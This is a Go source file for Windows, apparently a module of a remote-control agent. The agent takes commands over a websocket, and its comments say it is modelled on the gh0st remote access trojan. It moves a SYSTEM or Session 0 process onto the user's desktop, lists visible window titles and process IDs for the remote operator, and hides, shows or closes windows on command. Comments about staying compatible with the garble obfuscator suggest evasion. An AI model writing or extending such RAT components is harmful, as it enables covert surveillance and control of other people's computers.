//go:build windows

package main

import (
	"encoding/json"
	"fmt"
	"runtime"
	"strconv"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/gorilla/websocket"
)

// ═══ 窗口管理模块 (Windows) ═══
// 参考 gh0st RAT SystemManager.cpp:
// 1) SwitchInputDesktop() — 切换到用户桌面（关键!）
// 2) EnumWindows + 回调 — 枚举可见窗口
// 3) SendMessage(WM_GETTEXT) — 获取窗口标题
// 4) GetWindowThreadProcessId — 获取PID

var (
	modUser32WinMgr       = syscall.NewLazyDLL("user32.dll")
	procShowWindowWM      = modUser32WinMgr.NewProc("ShowWindow")
	procSetForegroundWin  = modUser32WinMgr.NewProc("SetForegroundWindow")
	procPostMessageWWM    = modUser32WinMgr.NewProc("PostMessageW")
	procEnumWindows       = modUser32WinMgr.NewProc("EnumWindows")
	procIsWindowVisible   = modUser32WinMgr.NewProc("IsWindowVisible")
	procSendMessageWM     = modUser32WinMgr.NewProc("SendMessageW")
	procGetWndThreadPidWM = modUser32WinMgr.NewProc("GetWindowThreadProcessId")
	procFindWindowExW     = modUser32WinMgr.NewProc("FindWindowExW")
	procGetDesktopWindow  = modUser32WinMgr.NewProc("GetDesktopWindow")
	procOpenInputDesktop  = modUser32WinMgr.NewProc("OpenInputDesktop")
)

const (
	swShow     = 5
	swHide     = 0
	swMinimize = 6
	swMaximize = 3
	swRestore  = 9
	wmClose    = 0x0010
	wmGetText  = 0x000D
)

type WindowInfo struct {
	Hwnd    int64  `json:"hwnd"`
	Title   string `json:"title"`
	Class   string `json:"class"`
	PID     uint32 `json:"pid"`
	Process string `json:"process"`
	State   string `json:"state"`
}

// switchInputDesktop 切换线程到用户输入桌面（参考gh0st SwitchInputDesktop）
// 如果Agent在Session0或服务桌面运行，不切换就看不到用户窗口
func switchInputDesktop() {
	hNew, _, _ := procOpenInputDesktop.Call(0, 0, 0x10000000) // MAXIMUM_ALLOWED
	if hNew != 0 {
		procSetThreadDesktop.Call(hNew)
		procCloseDesktop.Call(hNew)
	}
}

// enumWindowsResult 全局变量保存 EnumWindows 回调结果
var (
	enumWinMu     sync.Mutex
	enumWinResult []WindowInfo
)

// enumWindowsCallback EnumWindows 回调 (参考gh0st EnumWindowsProc)
var enumWindowsCallback = syscall.NewCallback(func(hwnd uintptr, lParam uintptr) uintptr {
	// 只要可见窗口
	vis, _, _ := procIsWindowVisible.Call(hwnd)
	if vis == 0 {
		return 1 // continue
	}

	// 用 SendMessage(WM_GETTEXT) 获取标题 (参考gh0st)
	buf := make([]uint16, 512)
	ret, _, _ := procSendMessageWM.Call(hwnd, wmGetText, uintptr(len(buf)), uintptr(unsafe.Pointer(&buf[0])))
	if ret == 0 {
		return 1 // 无标题，跳过
	}
	title := syscall.UTF16ToString(buf)
	if title == "" {
		return 1
	}

	// 获取PID
	var pid uint32
	procGetWndThreadPidWM.Call(hwnd, uintptr(unsafe.Pointer(&pid)))

	enumWinMu.Lock()
	enumWinResult = append(enumWinResult, WindowInfo{
		Hwnd:  int64(hwnd),
		Title: title,
		PID:   pid,
		State: "normal",
	})
	enumWinMu.Unlock()

	return 1 // continue
})

// enumWindowsFallback 使用 FindWindowExW 循环枚举（不需要回调，避免garble问题）
func enumWindowsFallback() []WindowInfo {
	var windows []WindowInfo
	desktop, _, _ := procGetDesktopWindow.Call()
	var hwnd uintptr
	buf := make([]uint16, 512)

	for {
		hwnd, _, _ = procFindWindowExW.Call(desktop, hwnd, 0, 0)
		if hwnd == 0 {
			break
		}
		vis, _, _ := procIsWindowVisible.Call(hwnd)
		if vis == 0 {
			continue
		}
		ret, _, _ := procSendMessageWM.Call(hwnd, wmGetText, uintptr(len(buf)), uintptr(unsafe.Pointer(&buf[0])))
		if ret == 0 {
			continue
		}
		title := syscall.UTF16ToString(buf)
		if title == "" {
			continue
		}
		var pid uint32
		procGetWndThreadPidWM.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
		windows = append(windows, WindowInfo{
			Hwnd:  int64(hwnd),
			Title: title,
			PID:   pid,
			State: "normal",
		})
	}
	return windows
}

func handleWindowList(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	defer func() {
		if r := recover(); r != nil {
			sendResult(conn, writeMu, "window_list_result", msg.ID,
				fmt.Sprintf(`{"error":"panic: %v"}`, r))
		}
	}()

	// 在锁定的OS线程上执行（桌面切换需要线程亲和性）
	ch := make(chan []WindowInfo, 1)
	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()

		// 关键! 先绑定到交互式窗口站，再切换到用户输入桌面
		// (Session 0 修复：SYSTEM 进程默认不在 WinSta0)
		attachToInteractiveDesktop()
		switchInputDesktop()

		// 方式1: EnumWindows (参考gh0st)
		enumWinMu.Lock()
		enumWinResult = nil
		enumWinMu.Unlock()

		ret, _, _ := procEnumWindows.Call(enumWindowsCallback, 0)
		if ret != 0 {
			enumWinMu.Lock()
			result := make([]WindowInfo, len(enumWinResult))
			copy(result, enumWinResult)
			enumWinResult = nil
			enumWinMu.Unlock()

			if len(result) > 0 {
				ch <- result
				return
			}
		}

		// 方式2: FindWindowExW 循环 (无回调，garble安全)
		windows := enumWindowsFallback()
		ch <- windows
	}()

	var windows []WindowInfo
	select {
	case windows = <-ch:
	case <-time.After(8 * time.Second):
		windows = []WindowInfo{}
	}

	if windows == nil {
		windows = []WindowInfo{}
	}

	result, _ := json.Marshal(map[string]interface{}{
		"windows": windows,
	})
	sendResult(conn, writeMu, "window_list_result", msg.ID, string(result))
}

func handleWindowControl(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	// Session 0 修复：绑定到用户交互式桌面
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	attachToInteractiveDesktop()
	switchInputDesktop()

	var req struct {
		Hwnd   string `json:"hwnd"`
		Action string `json:"action"`
	}
	json.Unmarshal(msg.Payload, &req)

	hwndVal, err := strconv.ParseInt(req.Hwnd, 10, 64)
	if err != nil {
		sendResult(conn, writeMu, "window_control_result", msg.ID,
			fmt.Sprintf(`{"success":false,"message":"invalid hwnd: %s"}`, jsonEsc(req.Hwnd)))
		return
	}
	hwnd := uintptr(hwndVal)

	// 参考gh0st TestWindow/CloseWindow
	switch req.Action {
	case "show":
		procShowWindowWM.Call(hwnd, swShow)
		procSetForegroundWin.Call(hwnd)
	case "hide":
		procShowWindowWM.Call(hwnd, swHide)
	case "minimize":
		procShowWindowWM.Call(hwnd, swMinimize)
	case "maximize":
		procShowWindowWM.Call(hwnd, swMaximize)
	case "restore":
		procShowWindowWM.Call(hwnd, swRestore)
	case "close":
		procPostMessageWWM.Call(hwnd, wmClose, 0, 0)
	default:
		sendResult(conn, writeMu, "window_control_result", msg.ID,
			fmt.Sprintf(`{"success":false,"message":"unknown action: %s"}`, jsonEsc(req.Action)))
		return
	}

	sendResult(conn, writeMu, "window_control_result", msg.ID,
		`{"success":true,"message":"ok"}`)
}
